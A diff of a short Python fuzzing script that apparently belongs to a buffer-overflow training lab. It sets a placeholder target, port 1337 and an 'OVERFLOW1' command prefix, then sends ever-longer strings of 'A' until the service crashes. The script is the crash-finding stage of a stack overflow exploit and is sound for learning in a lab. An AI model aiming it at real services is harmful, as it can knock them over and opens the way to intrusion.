@@ -2,12 +2,13 @@
 
 import socket, time, sys
 
-ip = ""
+ip = "MACHINE_IP"
 
-port = 
-timeout = 1
+port = 1337
+timeout = 5
+prefix = "OVERFLOW1 "
 
-string = "A" * 100
+string = prefix + "A" * 100
 
 while True:
   try:
@@ -15,11 +16,11 @@ while True:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
-      print("Fuzzing with {} bytes".format(len(string)))
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
   except:
-    print("Fuzzing crashed at {} bytes".format(len(string)))
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
-  string += 10 * "A"
-  time.sleep(3)
+  string += 100 * "A"
+  time.sleep(1)
